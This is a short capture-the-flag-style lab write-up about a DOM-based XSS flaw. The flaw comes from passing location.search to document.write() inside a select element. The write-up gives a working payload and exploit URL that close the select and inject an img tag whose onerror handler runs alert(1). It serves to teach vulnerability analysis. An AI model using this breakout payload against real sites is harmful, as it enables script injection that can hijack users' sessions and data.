#  Lab :DOM XSS in document.write Sink Using Source location.search Inside a Select Element


This lab contains a **DOM-Based XSS** vulnerability in the stock checker functionality. The application reads the `storeId` parameter from the URL and writes it into the page using `document.write()`. The input is placed inside a `<select>` element without proper sanitization.

## Analysis

### Source

```javascript
location.search
```

### Sink

```javascript
document.write()
```

The value of the `storeId` parameter is inserted into an `<option>` element within a `<select>` dropdown. Since the input is not escaped, an attacker can break out of the `<select>` element and inject arbitrary HTML/JavaScript.

## Exploitation

Payload:

```html
"></select><img src=1 onerror=alert(1)>
```

Exploit URL:

```text
/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

## Result

The payload closes the `<select>` element and injects an `<img>` tag with an `onerror` event handler. Since the image source is invalid, the `onerror` event triggers and executes:

```javascript
alert(1)
```

This confirms the presence of a DOM-Based XSS vulnerability and solves the lab.


The vulnerability occurs because user-controlled data from `location.search` is written into the DOM via `document.write()` without validation or encoding. By breaking out of the `<select>` element, an attacker can inject and execute arbitrary JavaScript.
